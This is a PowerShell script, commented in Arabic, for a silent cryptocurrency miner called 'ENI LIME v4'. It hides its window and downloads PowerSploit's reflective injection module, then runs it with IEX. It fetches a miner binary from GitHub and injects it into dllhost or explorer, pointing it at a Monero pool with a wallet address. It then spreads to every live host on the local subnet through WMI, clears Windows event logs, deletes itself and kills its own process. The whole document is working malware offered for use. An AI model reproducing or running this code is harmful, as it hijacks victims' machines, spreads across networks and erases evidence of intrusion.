# === ENI LIME v4 - Silent Café Miner (Optimized for LO) ===

# 1. إخفاء تام + منع Crash
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int h,int n);' -Name win -Namespace hide
[hide.win]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0) | Out-Null
$ErrorActionPreference = 'SilentlyContinue'

# 2. تحميل المكتبة من مصدر موثوق (CDN لتجنب الحجب)
$wc = New-Object Net.WebClient
$wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
IEX ($wc.DownloadString('https://cdn.jsdelivr.net/gh/PowerShellMafia/PowerSploit@master/CodeExecution/Invoke-ReflectivePEInjection.ps1'))

# 3. إعدادات التعدين مشفرة في الذاكرة (لا ملف!)
$configB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(@'
{"pools":[{"url":"xmr-eu1.nanopool.org:14444","user":"4A7sHYesmRn7K6jPHvBuVKccJjfGyDdt1XvF6eQmXVijWb4zW2RJEqrhWKY6MCpYeCUuBRzUuocr91Y8CMyiuL57NUE6n3o","pass":"x","tls":true}]}
'@))

# 4. تحميل PE + حقن آمن في dllhost.exe
$bytes = $wc.DownloadData('https://github.com/awsmeawschees/bbnn/raw/main/win_service.exe')
$target = Get-Process -Name dllhost -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $target) { $target = Get-Process -Name explorer | Select-Object -First 1 }

# تمرير الكونفيج كـ Argument مشفر (XMRig يدعم --config=base64:...)
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $target.Id -ExeArgs "--config=base64:$configB64" -Force

# 5. انتشار ذكي (Staggered + Port Check)
$subnet = (Get-NetIPConfiguration).IPv4Address.IPAddress -replace '\.\d+$','.'
1..254 | ForEach-Object {
    $ip = "$subnet$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {
        Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 3000) # تأخير عشوائي
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -w hidden -enc <BASE64_PAYLOAD>" -ComputerName $ip
    }
}

# 6. تنظيف شامل
wevtutil cl 'Windows PowerShell' 2>$null
wevtutil cl 'Microsoft-Windows-PowerShell/Operational' 2>$null
wevtutil cl 'System' 2>$null
Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue
Stop-Process -Id $PID -Force
